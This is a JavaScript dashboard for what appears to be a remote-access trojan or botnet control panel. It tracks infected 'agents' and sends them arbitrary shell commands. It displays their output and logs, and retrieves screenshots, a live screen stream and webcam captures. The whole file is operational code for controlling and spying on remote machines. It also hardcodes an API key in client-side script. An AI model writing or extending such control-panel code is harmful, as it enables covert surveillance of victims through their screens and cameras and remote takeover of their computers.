let socket;
let currentAgent = null;
let liveInterval = null;

const API_KEY = "fanky_super_secret_key_2026";

$(document).ready(function () {

    socket = io();

    // ---------------- SOCKET EVENTS ----------------

    socket.on('agent_update', function (data) {
        loadAgents();
        addLog(
            'agentsList',
            `Agent ${data.agent_id} ${data.status}`
        );
    });

    socket.on('command_update', function (data) {
        addLog(
            'resultsArea',
            `[${data.agent_id}] Command sent: ${data.command}`
        );
    });

    socket.on('command_result', function (data) {
        addLog(
            'resultsArea',
            `[${data.agent_id}] Result:\n${data.output}`
        );
    });

    socket.on('log_update', function (data) {

        if (currentAgent === data.agent_id) {

            addLog(
                'logsArea',
                `[${data.timestamp}] ${data.log}`
            );
        }
    });

    socket.on('media_update', function (data) {

        if (data.agent_id === currentAgent) {
            loadLatestMedia();
        }
    });

    // ---------------- PAGE SWITCH ----------------

    $('[data-page]').click(function () {

        $('[data-page]').removeClass('active');

        $(this).addClass('active');

        let page = $(this).data('page');

        $('#dashboardPage').toggle(page === 'dashboard');

        $('#logsPage').toggle(page === 'logs');

        $('#mediaPage').toggle(page === 'media');

        if (page === 'logs' && currentAgent) {
            loadLogs(currentAgent);
        }

        if (page === 'media' && currentAgent) {
            loadLatestMedia();
        }
    });

    // ---------------- AGENT SELECT ----------------

    $('#agentSelect').change(function () {

        currentAgent = $(this).val();

        if (currentAgent) {

            $('#selectedAgentDisplay')
                .text(currentAgent)
                .removeClass('bg-secondary')
                .addClass('bg-success');

            if ($('#logsPage').is(':visible')) {
                loadLogs(currentAgent);
            }

            if ($('#mediaPage').is(':visible')) {
                loadLatestMedia();
            }

        } else {

            $('#selectedAgentDisplay')
                .text('No agent selected')
                .removeClass('bg-success')
                .addClass('bg-secondary');

            stopLiveStream();
        }
    });

    // ---------------- COMMAND BUTTONS ----------------

    $('.btn-command').click(function () {

        if (!currentAgent) {
            alert('Select agent first!');
            return;
        }

        let cmd = $(this).data('cmd');

        if (cmd === 'screen_live') {

            startLiveStream();

        } else if (cmd === 'stop_live') {

            stopLiveStream();

        } else {

            sendCommand(currentAgent, cmd);
        }
    });

    // ---------------- CUSTOM COMMAND ----------------

    $('#sendCustomBtn').click(function () {

        if (!currentAgent) {
            alert('Select agent first!');
            return;
        }

        let cmd = $('#customCommand')
            .val()
            .trim();

        if (cmd) {

            sendCommand(currentAgent, cmd);

            $('#customCommand').val('');
        }
    });

    // ---------------- INIT ----------------

    loadAgents();

    setInterval(loadAgents, 10000);
});


// ===================================================
// LOAD AGENTS
// ===================================================

function loadAgents() {

    $.ajax({

        url: '/api/agents',

        type: 'GET',

        headers: {
            'X-API-KEY': API_KEY
        },

        success: function (agents) {

            let select = $('#agentSelect');

            let currentVal = select.val();

            select.empty();

            select.append(
                '<option value="">-- Select Agent --</option>'
            );

            agents.forEach(a => {

                select.append(`
                    <option 
                        value="${a.id}" 
                        ${currentVal === a.id ? 'selected' : ''}
                    >
                        ${a.id}
                    </option>
                `);
            });

            let html = agents.map(a => `

                <div class="col-md-3 col-sm-4 mb-2">

                    <div 
                        class="agent-badge card p-2" 
                        data-agent="${a.id}"
                    >

                        <strong>${a.id}</strong>

                        <span class="status-${a.status === 'online' ? 'online' : 'offline'}">
                            ●
                        </span>

                        <br>

                        <small>
                            Last seen:
                            ${new Date(a.last_seen).toLocaleTimeString()}
                        </small>

                    </div>

                </div>

            `).join('');

            $('#agentsList').html(
                html || '<div class="col-12">No agents</div>'
            );

            $('.agent-badge').click(function () {

                let id = $(this).data('agent');

                $('#agentSelect')
                    .val(id)
                    .trigger('change');
            });
        }
    });
}


// ===================================================
// SEND COMMAND
// ===================================================

function sendCommand(agentId, command) {

    addLog(
        'resultsArea',
        `[${agentId}] Sending: ${command}`
    );

    $.ajax({

        url: '/api/commands/submit',

        type: 'POST',

        contentType: 'application/json',

        headers: {
            'X-API-KEY': API_KEY
        },

        data: JSON.stringify({
            agent_id: agentId,
            command: command
        }),

        success: function (r) {

            addLog(
                'resultsArea',
                `[${agentId}] Command queued (ID: ${r.command_id})`
            );
        },

        error: function (x) {

            addLog(
                'resultsArea',
                `[${agentId}] Error: ${x.statusText}`
            );
        }
    });
}


// ===================================================
// LIVE STREAM
// ===================================================

function startLiveStream() {

    if (!currentAgent) return;

    stopLiveStream();

    $('#liveStreamArea').show();

    liveInterval = setInterval(() => {

        $.ajax({

            url: `/api/media/${currentAgent}/screen_live`,

            type: 'GET',

            headers: {
                'X-API-KEY': API_KEY
            },

            success: function (data) {

                if (data.data) {

                    $('#liveStreamImg').attr(
                        'src',
                        'data:image/jpeg;base64,' + data.data
                    );
                }
            },

            error: function () {

                console.log('Live stream failed');
            }
        });

    }, 2000);

    sendCommand(
        currentAgent,
        'screen_live_start'
    );
}

function stopLiveStream() {

    if (liveInterval) {

        clearInterval(liveInterval);

        liveInterval = null;
    }

    $('#liveStreamArea').hide();

    if (currentAgent) {

        sendCommand(
            currentAgent,
            'stop_live'
        );
    }
}


// ===================================================
// LOAD LOGS
// ===================================================

function loadLogs(agentId) {

    $.ajax({

        url: `/api/logs/${agentId}`,

        type: 'GET',

        headers: {
            'X-API-KEY': API_KEY
        },

        success: function (logs) {

            let html = logs.length

                ? logs.map(l => `

                    <div class="log-entry">

                        [${new Date(l.timestamp).toLocaleString()}]

                        ${escapeHtml(l.log)}

                    </div>

                `).join('')

                : '<div class="text-muted">No logs</div>';

            $('#logsArea').html(html);
        }
    });
}


// ===================================================
// LOAD MEDIA
// ===================================================

function loadLatestMedia() {

    if (!currentAgent) return;

    // SCREENSHOT

    $.ajax({

        url: `/api/media/${currentAgent}/screenshot`,

        type: 'GET',

        headers: {
            'X-API-KEY': API_KEY
        },

        success: function (data) {

            if (data.data) {

                $('#lastScreenshot').attr(
                    'src',
                    'data:image/jpeg;base64,' + data.data
                );
            }
        }
    });

    // CAMERA

    $.ajax({

        url: `/api/media/${currentAgent}/camera`,

        type: 'GET',

        headers: {
            'X-API-KEY': API_KEY
        },

        success: function (data) {

            if (data.data) {

                $('#lastCamera').attr(
                    'src',
                    'data:image/jpeg;base64,' + data.data
                );
            }
        }
    });
}


// ===================================================
// ADD LOG
// ===================================================

function addLog(areaId, msg) {

    let area = $('#' + areaId);

    area.append(`

        <div class="log-entry">

            ${escapeHtml(msg)}

        </div>

    `);

    area.scrollTop(
        area[0].scrollHeight
    );
}


// ===================================================
// ESCAPE HTML
// ===================================================

function escapeHtml(str) {

    return $('<div>')
        .text(str)
        .html();
}
